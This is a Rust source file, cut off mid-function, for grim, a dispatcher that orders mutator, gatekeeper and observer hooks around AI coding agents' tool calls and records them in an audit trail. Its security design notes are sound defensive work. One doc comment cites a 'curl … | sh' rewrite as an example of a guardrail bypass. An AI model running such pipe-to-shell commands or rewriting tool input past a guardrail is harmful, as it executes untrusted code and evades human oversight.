// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 The Grimoire Authors

//! The canonical response (C-003) and the tier pipeline (Decision O, C-011).
//!
//! ## Decision O is an ordering invariant, not a scheduling preference
//!
//! Ordering was originally specified *within* the mutator tier but not
//! *between* tiers, and the gap is a guardrail bypass rather than an
//! inelegance: a `gatekeeper` could allow `{"command": "cargo build"}` and a
//! `mutator` later in the same declaration-ordered list rewrite it to
//! `curl … | sh`, with grim emitting one aggregated `allow` **plus** the
//! rewrite. The guardrail would have approved bytes that never ran — and the
//! declaration order it depended on is the installing user's order, mutable by
//! an unrelated `grim add`.
//!
//! The invariant, in four parts:
//!
//! 1. every `mutator` runs **first**, serially, in declaration order,
//!    threading each output into the next as input, producing **one** final
//!    input;
//! 2. that final input is submitted to **every** `gatekeeper`;
//! 3. any `deny` is **absorbing** and suppresses the mutation entirely;
//! 4. `ask` outranks `allow`.
//!
//! So a gatekeeper always judges the bytes that will actually run and **never
//! sees pre-mutation input**. The accepted cost is that a mutator cannot react
//! to a denial. [`TierPlan`] is where part 1 and part 2 stop being prose:
//! the gatekeepers are unreachable until the mutator list is exhausted,
//! because they are a separate field consumed in a separate phase.
//!
//! **Residual risk, disclosed because grim cannot fix it.** This orders only
//! the hooks *grim* dispatches. Codex and Copilot **union** hook sources, so a
//! user's hand-authored native hook can sit in the same per-event array and
//! the **vendor** decides firing order between it and grim's dispatcher.
//! Kubernetes hit exactly this with independent mutating admission webhooks
//! and answered it with `reinvocationPolicy: IfNeeded`; no vendor here offers
//! an equivalent. A `gatekeeper` verdict can therefore be correct when grim
//! issues it and stale by the time the tool runs.
//!
//! ## Serial, not parallel, and that is the point
//!
//! Claude resolves competing `updatedInput` as last-process-to-exit-wins and
//! most other clients leave ordering `NOT DOCUMENTED`. Running the mutators
//! serially converts a race into a reproducible pipeline — which is a
//! capability no vendor offers, and the reason grim owns ordering at all.
//! Threading means grim re-encodes the tool input between mutators; that is
//! not the byte-preservation C-002 protects, because after the first rewrite
//! the value is grim's own composition rather than the client's payload.

use std::path::{Path, PathBuf};
use std::process::Stdio;

use serde::{Deserialize, Serialize};
use tokio::io::{AsyncReadExt as _, AsyncWriteExt as _};

use crate::hook::audit::{AuditInput, AuditLog, AuditOutcome, AuditRecord, AuditVerdict};
use crate::install::hook_dispatch::DispatchEntry;
use crate::oci::hook::{CanonicalEvent, DEFAULT_TIMEOUT_SECS, HookHandler, HookPayloadMode, HookTier};

use super::envelope::{self, EnvelopeMeta, ToolRef};

/// Maximum bytes grim reads back from a payload's stdout.
///
/// A canonical response is a small object; a payload that writes more than this
/// is either broken or hostile, and an unbounded read on the hot path of every
/// tool call is CWE-400. The read stops at the cap, which truncates the JSON and
/// degrades to [`CanonicalResponse::no_opinion`] — the same answer an unparsable
/// response already produces.
const MAX_RESPONSE_BYTES: u64 = 64 * 1024;

/// A canonical verdict — grim's own small, closed vocabulary (C-003).
///
/// Anything richer is native passthrough for one declared vendor, never a
/// fifth variant here.
///
/// Closed internal enum: the binary is the only consumer, so matches stay
/// total — no `#[non_exhaustive]`.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Decision {
    /// Let the operation proceed.
    Allow,
    /// Block the operation. **Absorbing** — see [`aggregate`].
    Deny,
    /// Escalate to the user. Outranks [`Allow`](Self::Allow).
    Ask,
    /// No opinion; the client's own default applies.
    ///
    /// The `Default`, because a payload that answers `{}` has expressed no
    /// verdict and every degrade path lands here (I3).
    #[default]
    None,
}

impl Decision {
    /// Aggregation rank, lowest first: `none` < `allow` < `ask` < `deny`.
    ///
    /// A total order rather than a pairwise `match`, because parts 3 and 4 of
    /// Decision O are one statement — "the most restrictive verdict wins" —
    /// and expressing it twice is how `ask` eventually loses to `allow` in one
    /// of the two places.
    pub fn rank(self) -> u8 {
        match self {
            Self::None => 0,
            Self::Allow => 1,
            Self::Ask => 2,
            Self::Deny => 3,
        }
    }
}

impl std::fmt::Display for Decision {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(match self {
            Self::Allow => "allow",
            Self::Deny => "deny",
            Self::Ask => "ask",
            Self::None => "none",
        })
    }
}

/// The canonical response a payload returns, before any per-client projection
/// (C-003).
///
/// Small and closed on purpose. It is projected onto the invoking client's
/// shape by [`super::projector`], which refuses any field that pair has no
/// target for rather than dropping it silently.
///
/// Deserialized straight from the payload's stdout, every field defaulted: a
/// hook answers only about what it has an opinion on, and `{}` is the
/// no-opinion answer rather than a malformed one. Unknown members are ignored
/// (not denied) so a payload written against a newer envelope schema still
/// answers this one — the same degrade direction W2 takes for the table.
#[derive(Debug, Clone, PartialEq, Default, Serialize, Deserialize)]
#[serde(default)]
pub struct CanonicalResponse {
    /// The verdict.
    pub decision: Decision,
    /// Human-readable justification accompanying a verdict. Required by codex
    /// when blocking — enforced in its **output parser** rather than its JSON
    /// schema, so an omitted reason fails closed rather than validating.
    pub reason: Option<String>,
    /// Extra context for the agent, where the client can express it.
    pub context: Option<String>,
    /// A message aimed at the user rather than the model.
    pub user_message: Option<String>,
    /// Whether the agent's turn should stop.
    pub stop: bool,
    /// The rewritten tool input — `mutator` tier only, `PreToolUse` only.
    ///
    /// **S-016:** where the client's response shape supports it, a rewrite
    /// also emits a line describing itself through `context` /
    /// `user_message`, so the agent's own transcript records that its command
    /// was altered. No vendor does this by default, and mutator control 5
    /// exists precisely because a silent rewrite is indistinguishable from the
    /// model having asked for the new command.
    pub updated_input: Option<serde_json::Value>,
}

impl CanonicalResponse {
    /// The no-opinion response: what a timeout, an unparsable answer, a
    /// withheld verdict and an empty matched set all degrade to.
    ///
    /// Named rather than open-coded because "no opinion" is reached from many
    /// failure paths and each one must reach the *same* value — a `deny`
    /// assembled by accident on a failure path is the outcome I3 forbids.
    pub fn no_opinion() -> Self {
        // Spelled as the derived default so the two cannot drift: `#[serde(default)]`
        // on this struct makes `Default` the shape a `{}` answer deserializes to,
        // and that shape must be exactly "no opinion".
        Self::default()
    }
}

/// The armed set, partitioned by the order Decision O fixes.
///
/// Two phases in two fields, and the separation is the enforcement: nothing
/// can submit a pre-mutation input to a gatekeeper, because the gatekeepers
/// are not reachable from the phase that runs the mutators.
///
/// Borrowed from the caller's row set — the plan is an ordering over rows the
/// dispatch table owns, never a copy of them.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct TierPlan<'a> {
    /// Every `mutator`, in declaration order. Run serially, each output
    /// threaded into the next.
    pub mutators: Vec<&'a DispatchEntry>,
    /// Every `gatekeeper`, all judging the one final input.
    pub gatekeepers: Vec<&'a DispatchEntry>,
    /// Every `observer`. Their responses cannot change what happens, so they
    /// run in the second phase and their verdicts are discarded — listed
    /// rather than dropped here because they still produce audit records.
    pub observers: Vec<&'a DispatchEntry>,
}

/// One hook's answer, paired with the identity the audit trail records.
#[derive(Debug, Clone, PartialEq)]
pub struct HookOutcome {
    /// `<artifact>/<id>`.
    pub hook: String,
    /// The tier the entry declared — which decides whether its verdict counts
    /// and whether its rewrite is honoured.
    pub tier: HookTier,
    /// What it returned, already degraded to
    /// [`CanonicalResponse::no_opinion`] if it timed out or answered
    /// unusably.
    pub response: CanonicalResponse,
}

/// Everything one `grim hook run` invocation knows that is **not** per hook —
/// grim's half of the C-002 envelope, plus the audit sink.
///
/// **This type is the Implement phase's answer to F-B**, and the choice it
/// records is "`compose` takes the envelope meta plus the audit sink" rather
/// than "the spawn moves out into `dispatch`". Two reasons, and the second is
/// the load-bearing one:
///
/// - The stubbed `compose(&TierPlan, raw)` could not build an envelope at all:
///   it saw only what a [`DispatchEntry`] carries (`artifact`, `id`, `event`,
///   `tier`), so `client`, `scope`, `native_event`, `cwd`, `session_id` and
///   `correlation_id` had nowhere to come from.
/// - **C-012's rule is per hook and per tier** — *do not spawn this observer*,
///   *spawn this mutator but discard its rewrite* — so the decision has to sit
///   where the spawn is. Moving the spawn out into `dispatch` would have taken
///   Decision O's ordering with it: the mutator chain's threading and the
///   "gatekeepers see only the final input" invariant are the reason `TierPlan`
///   has two fields consumed in two phases, and splitting the loop from the plan
///   would put that invariant back into prose.
///
/// Borrowed throughout, like [`EnvelopeMeta`]: every value here is one the
/// runtime already holds.
#[derive(Debug, Clone, Copy)]
pub struct Invocation<'a> {
    /// grim's name for the invoking client — a lookup key, never a trust input.
    pub client: &'a str,
    /// The armed root in readable form (`global`, or a workspace path), taken
    /// from the dispatch table's own `root` field. Diagnostics and the
    /// envelope's `scope` member; never matched against anything (C-007).
    pub scope: &'a str,
    /// The canonical firing event.
    pub event: CanonicalEvent,
    /// The client's own spelling of that event, needed because the event echo
    /// must carry the **firing** name.
    pub native_event: &'a str,
    /// The working directory the **client** reported, out of its own payload.
    pub cwd: &'a str,
    /// The client's session identifier, when it supplies one.
    pub session_id: Option<&'a str>,
    /// Joins this invocation's records and log lines to each other.
    pub correlation_id: &'a str,
    /// Where the audit records go (C-012). The trail is the dispatch table's
    /// sibling — see [`super::run::audit_trail_path`].
    pub audit: &'a AuditLog,
}

/// Partition `armed` into Decision O's phases, preserving declaration order
/// within each.
///
/// Declaration order is the dispatch table's row order, which
/// `hook_registrar::desired_entries` already sorts deterministically so a
/// re-write with no change is byte-identical. This function must not reorder
/// within a tier: the mutator chain's meaning depends on it.
pub fn order<'a>(armed: &[&'a DispatchEntry]) -> TierPlan<'a> {
    let of_tier = |tier: HookTier| -> Vec<&'a DispatchEntry> {
        armed.iter().copied().filter(|entry| entry.tier == tier).collect()
    };
    TierPlan {
        mutators: of_tier(HookTier::Mutator),
        gatekeepers: of_tier(HookTier::Gatekeeper),
        observers: of_tier(HookTier::Observer),
    }
}

/// The aggregate verdict over every hook whose tier lets it have one.
///
/// Parts 3 and 4 of Decision O, as one `max` over [`Decision::rank`]: `deny`
/// is absorbing because it ranks highest, and `ask` outranks `allow` because
/// it ranks above it. An empty set is [`Decision::None`].
///
/// **Only a `gatekeeper` has a verdict**, and the Implement phase narrowed this
/// from "not an observer" to exactly that. A tier is a *capability
/// declaration* — `gatekeeper` is the one that says "may return a verdict that
/// blocks the operation", `mutator` says "may rewrite the tool input" — and
/// letting a mutator's `deny` through would grant it a capability its
/// declaration does not carry. That matters beyond tidiness: C-011's control 6
/// shows the user the **tier** in the approval prompt with distinct mutator
/// wording, so a user who approved a `mutator` was never told it could block
/// their tool calls. A hook that needs both capabilities declares both entries,
/// so nothing is lost. A withheld verdict is reported at the call site rather
/// than dropped in silence — see [`invoke`].
pub fn aggregate(outcomes: &[HookOutcome]) -> Decision {
    outcomes
        .iter()
        .filter(|outcome| outcome.tier == HookTier::Gatekeeper)
        .map(|outcome| outcome.response.decision)
        .max_by_key(|decision| decision.rank())
        .unwrap_or(Decision::None)
}

/// Assemble the one canonical response grim returns for this invocation.
///
/// Runs [`order`]'s two phases, threads the mutator chain, submits the single
/// final input to every gatekeeper, aggregates with [`aggregate`], and — part
/// 3 — **suppresses the mutation entirely** when the verdict is
/// [`Decision::Deny`]: denied bytes must not also be rewritten, or the client
/// would carry a rewrite for an operation that never runs.
///
/// # Errors
///
/// None. Every failure a hook can produce degrades to
/// [`CanonicalResponse::no_opinion`], because the caller's only permitted exit
/// code is 0.
pub async fn compose(plan: &TierPlan<'_>, invocation: &Invocation<'_>, raw: &[u8]) -> CanonicalResponse {
    // Read once, not once per hook: `build` runs for every armed row, and the
    // tool does not change between them.
    let tool = envelope::tool_from_raw(raw);

    // **C-012, probed once.** Whether the trail can be appended to is a property
    // of the filesystem, not of any one hook, so it is established here and the
    // *tier-aware* consequence is applied per hook inside `invoke`.
    let logged = audit_is_writable(invocation.audit).await;
    if !logged {
        tracing::warn!(
            "the hook audit trail at {} cannot be appended to; observers and gatekeepers will not \
             be spawned and any mutator rewrite will be discarded (C-012). No hook is denied and \
             the exit code stays 0",
            invocation.audit.path().display()
        );
    }

    let mut outcomes: Vec<HookOutcome> = Vec::new();
    // The threaded tool input. `None` when the payload names no tool at all, in
    // which case there is nothing for a mutator to rewrite.
    let mut input: Option<Vec<u8>> = tool.map(|tool| tool.input.to_vec());
    let mut rewrote: Vec<String> = Vec::new();

    // ── Phase 1: every mutator, serially, in declaration order ──────────────
    //
    // Serial is the capability, not a simplification: Claude resolves competing
    // `updatedInput` as last-process-to-exit-wins and most clients leave the
    // ordering undocumented, so threading the chain converts a race into a
    // reproducible pipeline (Decision O part 1).
    for entry in &plan.mutators {
        let outcome = invoke(entry, invocation, raw, tool_view(tool, input.as_deref()), logged).await;
        if let Some(rewrite) = outcome.response.updated_input.as_ref() {
            match serde_json::to_vec(rewrite) {
                Ok(bytes) => {
                    // Grim's own composition from here on, which is why
                    // re-encoding it is not the byte-preservation C-002 protects:
                    // after the first rewrite the value is no longer the client's.
                    input = Some(bytes);
                    rewrote.push(outcome.hook.clone());
                }
                Err(e) => tracing::warn!(
                    "{}: its rewrite could not be encoded and was dropped: {e}",
                    outcome.hook
                ),
            }
        }
        outcomes.push(outcome);
    }

    // ── Phase 2: every gatekeeper, then every observer, on the FINAL input ───
    //
    // Unreachable from phase 1 by construction (`TierPlan`'s two fields), which
    // is what makes "a gatekeeper never observes pre-mutation input" an ordering
    // invariant rather than a comment (Decision O part 2).
    let threaded = tool_view(tool, input.as_deref());
    for entry in plan.gatekeepers.iter().chain(&plan.observers) {
        outcomes.push(invoke(entry, invocation, raw, threaded, logged).await);
    }

    assemble(&outcomes, input.as_deref(), &rewrote)
}

/// Record that each armed hook in `declined` had its matcher decline this tool
/// call (S-004) — **one write for the whole invocation**.
///
/// Written even though nothing was spawned, because *"the guardrail did not
/// apply here"* is the most common forensic question about a hook, and an absent
/// record cannot distinguish it from *"the guardrail was never armed"*. The
/// trail's own rotation bounds the volume.
///
/// **Takes the whole declined set rather than one entry** (F-2). The records are
/// unchanged and so is their order; what changed is that the `create_dir_all`,
/// the rotation `statx` and the open are paid once per invocation instead of once
/// per armed hook — measured at +0.04 ms per hook on ext4 but **+14.1 ms per
/// hook on a 9P `$GRIM_HOME`**, where ten armed-but-unmatched hooks made every
/// tool call cost 142 ms at p50. An empty set writes nothing at all, which is
/// what keeps the two early-return scenarios from ever creating a trail.
///
/// Lives here rather than in [`super::run`] so that **one module owns every
/// write to the trail** — the record shape, the sanitization boundary and the
/// blocking-I/O handling are then in one place rather than two.
pub async fn record_no_matches(invocation: &Invocation<'_>, declined: &[&DispatchEntry]) {
    if declined.is_empty() {
        return;
    }
    let records: Vec<AuditRecord> = declined
        .iter()
        .map(|entry| {
            AuditRecord::new(&AuditInput {
                hook_id: &entry.id,
                event: entry.event,
                client: invocation.client,
                tier: entry.tier,
                correlation_id: invocation.correlation_id,
                digest: entry.resolved_digest.as_deref().unwrap_or_default(),
                changed_fields: &[],
                payload_bytes: 0,
                response_bytes: 0,
                // No verdict was reached, because nothing ran.
                verdict: None,
                outcome: AuditOutcome::NoMatch,
            })
        })
        .collect();
    append_records(invocation.audit, records).await;
}

/// The tool view one hook is handed: the client's tool **name** with the
/// current threaded **input**.
fn tool_view<'a>(tool: Option<ToolRef<'a>>, input: Option<&'a [u8]>) -> Option<ToolRef<'a>> {
    let tool = tool?;
    Some(ToolRef {
        name: tool.name,
        input: input.unwrap_or(tool.input),
    })
}

/// Whether the audit trail can be appended to (C-012's precondition), off the
/// runtime's worker thread.
///
/// A **probe** rather than a write, because the record a hook produces is only
/// knowable after it has run while the fail-closed decision must be made before
/// the spawn. [`AuditLog::writable`] is the probe itself and owns how the trail
/// is opened — this function is only the `spawn_blocking` wrapper. It used to
/// re-spell that prelude here (`create_dir_all` + `OpenOptions`), which was WP-K's
/// finding G-6: two spellings of "how the trail is opened" drift, and the drift
/// direction is a probe that answers a different question than the append.
///
/// A join failure counts as *not writable*: an unanswerable question takes the
/// tier-aware degrade rather than assuming the trail is fine.
async fn audit_is_writable(log: &AuditLog) -> bool {
    let log = log.clone();
    tokio::task::spawn_blocking(move || log.writable())
        .await
        .unwrap_or(false)
}

/// Append one record, off the async runtime's worker threads.
///
/// The shape [`invoke`] needs: a record produced *after* a spawn cannot be
/// batched with the next hook's, because the next hook has not run yet.
async fn append_record(log: &AuditLog, record: AuditRecord) {
    append_records(log, vec![record]).await;
}

/// Append a whole invocation's records in one open and one write, off the async
/// runtime's worker threads.
///
/// The single seam for every trail write, so the F-2 batch and the per-record
/// path report a failure the same way. `AuditLog::append_all` is deliberately
/// synchronous (positioned writes, and an open handle would hold across the
/// payload's whole lifetime), so the runtime hands it to `spawn_blocking` rather
/// than blocking a reactor thread — `quality-rust.md` makes `std::fs` in an
/// async path Block-tier.
///
/// Batching is for the records one invocation **already holds**, which is the
/// no-match set; holding a post-spawn record back to join a later one would
/// trade durability for a syscall.
async fn append_records(log: &AuditLog, records: Vec<AuditRecord>) {
    let log = log.clone();
    let appended = tokio::task::spawn_blocking(move || log.append_all(&records)).await;
    // The trail is forensics; a failure to write it must never change what grim
    // returns (I3). The tier-aware consequence of an unwritable trail was already
    // decided by `audit_is_writable` before the spawn, so a failure *here* — the
    // trail becoming unwritable between the probe and the append — is reported and
    // nothing more.
    match appended {
        Ok(Ok(())) => {}
        Ok(Err(e)) => tracing::warn!("the hook audit record could not be appended: {e}"),
        Err(e) => tracing::warn!("the hook audit append task did not complete: {e}"),
    }
}
/// The audit outcome for a hook that ran while the trail was unwritable.
///
/// **A named function so the rule can be tested** (round 3, S4/M6): it was an
/// assignment inside an `if`, and moving it back outside — the bug it fixes —
/// left the whole suite green.
///
/// [`AuditOutcome::RewriteDiscardedUnlogged`] is a claim about a rewrite that
/// *existed* and was dropped. Recording it for a mutator that returned no
/// `updated_input` made the trail read as a suppressed mutation that never
/// happened — a false positive in the one record a reader consults to ask whether
/// an unlogged mutation occurred. A mutator that rewrote nothing simply
/// [`Completed`](AuditOutcome::Completed); the unwritable trail is already
/// reported on its own.
fn unlogged_mutator_outcome(had_rewrite: bool) -> AuditOutcome {
    if had_rewrite {
        AuditOutcome::RewriteDiscardedUnlogged
    } else {
        AuditOutcome::Completed
    }
}

/// Run one hook and record it.
///
/// `logged` is the C-012 probe's answer, and the whole tier table hangs off it:
///
/// | Tier | `logged == false` |
/// |---|---|
/// | `observer`, `gatekeeper` | **not spawned**, no verdict, [`AuditOutcome::NotSpawnedUnlogged`] |
/// | `mutator` | **spawned**; if it rewrote, the rewrite is **discarded** and the outcome is
///   [`AuditOutcome::RewriteDiscardedUnlogged`] with verdict `Some(Mutate)`. A mutator that
///   rewrote **nothing** reports [`Completed`](AuditOutcome::Completed) — see
///   [`unlogged_mutator_outcome`] |
///
/// Never returns a `deny` it was not given, and never anything but exit 0 for
/// the caller: every failure — an unbuildable envelope, a failed spawn, a
/// timeout, an unusable answer — degrades to
/// [`CanonicalResponse::no_opinion`] (I3).
async fn invoke(
    entry: &DispatchEntry,
    invocation: &Invocation<'_>,
    raw: &[u8],
    tool: Option<ToolRef<'_>>,
    logged: bool,
) -> HookOutcome {
    // The label every log line, the envelope's `hook` field and the audit record
    // carry for this entry.
    //
    // **The `tracing` sink is not sanitized, and that is the P-6 residual.** The
    // envelope drops any value with a brace, bracket or control character
    // (`envelope::is_flat_scalar`) and `AuditRecord::new` sanitizes on the way in,
    // so those two are closed; a log line is not. What holds it today is
    // upstream: `id` is charset-validated at `grim build` *and* re-validated
    // against the materialized manifest at the install seam
    // (`HookManifest::validate_installed`), so no row grim arms can carry a
    // terminal-escape sequence here. The gap that survives is a **dispatch table
    // written by a grim that predates that rule** — `read_table` re-checks the
    // matcher length and `payload_dir`, never the `id`. Deliberately not added
    // there: that reader rejects the whole table on a bad row, so one stale `id`
    // would disarm every hook on the machine, which is the wrong trade for a
    // cosmetic sink. The next `grim install` rewrites the root wholesale.
    let hook = format!("{}/{}", entry.artifact, entry.id);
    let digest = entry.resolved_digest.as_deref().unwrap_or_default();
    let record = |outcome: AuditOutcome, verdict: Option<AuditVerdict>, sizes: (usize, usize), changed: &[String]| {
        AuditRecord::new(&AuditInput {
            hook_id: &entry.id,
            event: entry.event,
            client: invocation.client,
            tier: entry.tier,
            // The envelope's own id, so the record joins to the stdin grim
            // wrote for this invocation (G-1).
            correlation_id: invocation.correlation_id,
            // Copied, never computed — C-009. `None` (a path-sourced dev
            // install) records the empty string rather than a fresh digest.
            digest,
            changed_fields: changed,
            payload_bytes: sizes.0,
            response_bytes: sizes.1,
            verdict,
            outcome,
        })
    };
    let degraded = |response: CanonicalResponse| HookOutcome {
        hook: hook.clone(),
        tier: entry.tier,
        response,
    };

    let meta = EnvelopeMeta {
        event: invocation.event,
        native_event: invocation.native_event,
        client: invocation.client,
        scope: invocation.scope,
        hook: &hook,
        tier: entry.tier,
        cwd: invocation.cwd,
        session_id: invocation.session_id,
        correlation_id: invocation.correlation_id,
        payload_dir: &entry.payload_dir,
        tool,
    };
    let envelope = match envelope::build(&meta, raw) {
        Ok(envelope) => envelope,
        Err(e) => {
            // Unreachable through `run::dispatch`, which refuses a non-object
            // payload before any hook is selected; reported rather than
            // panicked so a second caller cannot turn it into an exit 101.
            tracing::warn!("{hook}: {e}; nothing was spawned");
            append_record(invocation.audit, record(AuditOutcome::SpawnFailed, None, (0, 0), &[])).await;
            return degraded(CanonicalResponse::no_opinion());
        }
    };

    // C-012, rows 1 and 2: withhold the invocation itself.
    if !logged && entry.tier != HookTier::Mutator {
        tracing::warn!(
            "{hook} was not spawned: its invocation could not be audited, and an unauditable \
             {} is withheld rather than run unlogged (C-012). The tool call proceeds",
            entry.tier
        );
        // Attempted even though the probe failed: the trail may have become
        // writable in between, and a record of a withheld invocation is exactly
        // what a reader of the trail needs. A failure here is already reported by
        // `append_record`.
        append_record(
            invocation.audit,
            record(AuditOutcome::NotSpawnedUnlogged, None, (envelope.len(), 0), &[]),
        )
        .await;
        return degraded(CanonicalResponse::no_opinion());
    }

    let spawned = spawn_payload(entry, &meta, invocation.audit.path().parent(), &envelope).await;
    let (stdout, failure) = match spawned {
        Ok((stdout, None)) => (stdout, None),
        Ok((stdout, Some(outcome))) => (stdout, Some(outcome)),
        Err(e) => {
            tracing::warn!("{hook}: its handler could not be spawned ({e}); no verdict, exit 0 (S-009)");
            append_record(
                invocation.audit,
                record(AuditOutcome::SpawnFailed, None, (envelope.len(), 0), &[]),
            )
            .await;
            return degraded(CanonicalResponse::no_opinion());
        }
    };

    let sizes = (envelope.len(), stdout.len());
    let mut response = match failure {
        Some(outcome) => {
            append_record(invocation.audit, record(outcome, None, sizes, &[])).await;
            return degraded(CanonicalResponse::no_opinion());
        }
        // **Exit 0 with empty stdout is the fail-safe shape, not a malformed
        // answer**, and it is what every payload that has nothing to say
        // produces. Recording it as `ResponseRejected` would make the most
        // ordinary invocation in the trail read like a broken hook.
        None if stdout.iter().all(u8::is_ascii_whitespace) => CanonicalResponse::no_opinion(),
        None => match serde_json::from_slice::<CanonicalResponse>(&stdout) {
            Ok(response) => response,
            Err(e) => {
                tracing::warn!("{hook}: its answer was not a canonical response ({e}); no verdict, exit 0");
                append_record(
                    invocation.audit,
                    record(AuditOutcome::ResponseRejected, None, sizes, &[]),
                )
                .await;
                return degraded(CanonicalResponse::no_opinion());
            }
        },
    };

    // An observer's verdict changes nothing, so it never reaches `aggregate`
    // (which filters the tier) — but the trail records what the hook *said*.
    let mut verdict = Some(verdict_of(&response));
    let mut changed = changed_fields(tool.map(|tool| tool.input), response.updated_input.as_ref());
    let mut outcome = AuditOutcome::Completed;

    // C-012, row 3: the invocation stands, the rewrite does not.
    if !logged {
        if response.updated_input.take().is_some() {
            tracing::warn!(
                "{hook} ran but its rewrite was discarded: the invocation could not be audited, and \
                 an UNLOGGED MUTATION is the one outcome this failure mode must not produce \
                 (C-012). The tool call proceeds with its original input"
            );
            verdict = Some(AuditVerdict::Mutate);
            outcome = unlogged_mutator_outcome(true);
        }
        // The rewrite never happened, so no field changed.
        changed = Vec::new();
    }
    // A tier does not get a capability its declaration does not carry, in either
    // direction — and both are reported rather than dropped in silence, because a
    // hook whose answer is being ignored looks exactly like a hook that is working.
    if entry.tier != HookTier::Mutator && response.updated_input.take().is_some() {
        tracing::warn!(
            "{hook} is declared `{}`, so its rewrite was ignored — only a `mutator` may rewrite a \
             tool's input",
            entry.tier
        );
        changed = Vec::new();
    }
    if entry.tier != HookTier::Gatekeeper && response.decision != Decision::None {
        tracing::warn!(
            "{hook} is declared `{}`, so its `{}` verdict was ignored — only a `gatekeeper` may \
             return a verdict, and the approval prompt the user saw named this tier",
            entry.tier,
            response.decision
        );
    }

    append_record(invocation.audit, record(outcome, verdict, sizes, &changed)).await;
    HookOutcome {
        hook,
        tier: entry.tier,
        response,
    }
}

/// The canonical verdict, in the audit trail's vocabulary.
fn verdict_of(response: &CanonicalResponse) -> AuditVerdict {
    if response.updated_input.is_some() {
        return AuditVerdict::Mutate;
    }
    match response.decision {
        Decision::Allow => AuditVerdict::Allow,
        Decision::Deny => AuditVerdict::Deny,
        Decision::Ask => AuditVerdict::Ask,
        Decision::None => AuditVerdict::NoOpinion,
    }
}

/// The **names** of the top-level tool-input fields a rewrite changed.
///
/// Names only, never values: recording the values is the secret-capture and
/// log-injection path C-012's redaction level exists to close. An input or a
/// rewrite that is not an object contributes no names rather than a guess.
fn changed_fields(original: Option<&[u8]>, rewrite: Option<&serde_json::Value>) -> Vec<String> {
    let Some(rewrite) = rewrite.and_then(serde_json::Value::as_object) else {
        return Vec::new();
    };
    let before: serde_json::Map<String, serde_json::Value> = original
        .and_then(|bytes| serde_json::from_slice(bytes).ok())
        .unwrap_or_default();
    let mut changed: Vec<String> = rewrite
        .iter()
        .filter(|(key, value)| before.get(*key) != Some(*value))
        .map(|(key, _)| key.clone())
        .chain(before.keys().filter(|key| !rewrite.contains_key(*key)).cloned())
        .collect();
    changed.sort();
    changed.dedup();
    changed
}

/// Assemble the one response for this invocation out of every hook's answer.
///
/// Decision O parts 3 and 4 live in [`aggregate`]; what is here is the rest of
/// the roll-up:
///
/// - the **reason** is the deciding hook's own, so the text the client shows
///   belongs to the hook that produced the verdict;
/// - a **`deny` suppresses the rewrite entirely** — denied bytes must not also be
///   rewritten, or the client carries a rewrite for an operation that never runs;
/// - a surviving rewrite **describes itself** through `context` (S-016, mutator
///   control 5): no vendor does this, and a silent rewrite is indistinguishable
///   from the model having asked for the new command;
/// - an **observer contributes nothing at all** — not a verdict, not a reason,
///   not context. A tier that changes nothing must not be able to change what
///   the agent is told either.
fn assemble(outcomes: &[HookOutcome], input: Option<&[u8]>, rewrote: &[String]) -> CanonicalResponse {
    let decision = aggregate(outcomes);
    // Gatekeepers only, matching `aggregate`: the reason the client shows must
    // belong to the hook that actually produced the verdict, so the two filters
    // are the same filter.
    let deciding = outcomes
        .iter()
        .filter(|outcome| outcome.tier == HookTier::Gatekeeper)
        .find(|outcome| decision != Decision::None && outcome.response.decision == decision);

    let updated_input = if decision == Decision::Deny || rewrote.is_empty() {
        None
    } else {
        input.and_then(|bytes| serde_json::from_slice::<serde_json::Value>(bytes).ok())
    };

    let mut context: Vec<String> = Vec::new();
    if updated_input.is_some() {
        context.push(format!(
            "grim rewrote this tool's input before it ran (hook: {})",
            rewrote.join(", ")
        ));
    }
    context.extend(
        outcomes
            .iter()
            .filter(|outcome| outcome.tier != HookTier::Observer)
            .filter_map(|outcome| outcome.response.context.clone()),
    );

    CanonicalResponse {
        decision,
        reason: deciding.and_then(|outcome| outcome.response.reason.clone()),
        context: (!context.is_empty()).then(|| context.join("\n")),
        user_message: outcomes
            .iter()
            .filter(|outcome| outcome.tier != HookTier::Observer)
            .find_map(|outcome| outcome.response.user_message.clone()),
        stop: outcomes
            .iter()
            .any(|outcome| outcome.tier != HookTier::Observer && outcome.response.stop),
        updated_input,
    }
}

/// Spawn one payload with the envelope on its stdin and read its answer back.
///
/// Returns the payload's stdout plus, when the invocation did not complete
/// normally, the [`AuditOutcome`] describing why. `Err` is reserved for "the
/// handler could not be started at all" (S-009), which the caller degrades to no
/// opinion.
///
/// Four properties are deliberate:
///
/// - **the envelope goes on stdin**, never in argv or the environment (I6);
/// - the child runs **from `payload_dir`**, so a relative handler and a payload's
///   own siblings resolve;
/// - **stderr is discarded.** Surfacing it would render publisher-controlled
///   bytes into a stream a human reads in a terminal — CWE-117 with
///   ANSI-escape spoofing, the same class `src/hook/audit.rs` sanitizes against.
///   The audit trail is the record of what ran;
/// - the child is **killed on drop** and on timeout, so an over-running payload
///   cannot outlive the invocation. Both halves are bounded: the stdout read
///   *and* the wait for the process to exit. Bounding only the read left a
///   payload that answers and then keeps running able to block the dispatcher —
///   and the user's tool call — indefinitely, because `kill_on_drop` cannot fire
///   while the `Child` is still alive inside the await.
async fn spawn_payload(
    entry: &DispatchEntry,
    meta: &EnvelopeMeta<'_>,
    private_dir: Option<&Path>,
    envelope: &[u8],
) -> std::io::Result<(Vec<u8>, Option<AuditOutcome>)> {
    let payload_file = match entry.payload {
        HookPayloadMode::Stdin => None,
        HookPayloadMode::File => Some(write_payload_file(private_dir, entry, envelope).await?),
    };
    let mut command = handler_command(&entry.handler, &entry.payload_dir);
    command
        .current_dir(&entry.payload_dir)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::null())
        .kill_on_drop(true);
    for (name, value) in envelope::environment(meta, payload_file.as_deref()) {
        command.env(name, value);
    }

    let mut child = command.spawn()?;
    let stdin = child.stdin.take();
    let stdout = child.stdout.take();
    let bytes = envelope.to_vec();
    let read = async move {
        if let Some(mut stdin) = stdin {
            // A payload that never reads its stdin makes this fail with a broken
            // pipe, which is not an error here: the answer is still read back.
            let _ = stdin.write_all(&bytes).await;
            let _ = stdin.shutdown().await;
            drop(stdin);
        }
        let mut answer = Vec::new();
        if let Some(stdout) = stdout {
